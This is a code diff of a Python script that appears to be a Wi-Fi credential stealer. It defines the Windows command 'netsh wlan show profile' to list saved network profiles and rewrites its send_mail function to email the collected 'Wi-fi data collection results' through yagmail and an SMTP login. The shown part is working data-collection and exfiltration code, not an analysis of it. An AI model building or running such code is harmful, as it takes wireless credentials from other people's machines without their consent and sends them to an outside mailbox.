@@ -1,16 +1,15 @@
 #! /usr/bin/env python
 
 import subprocess
-import smtplib
+import yagmail
 import re
 
 
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+# TODO: Make this function universal in the GUI project.
+def send_mail(email, password, content):
+    topic = "Wi-fi data collection results"
+    yag = yagmail.SMTP(email, password)
+    yag.send(email, topic, content)
 
 
 command_display_networks = "netsh wlan show profile"
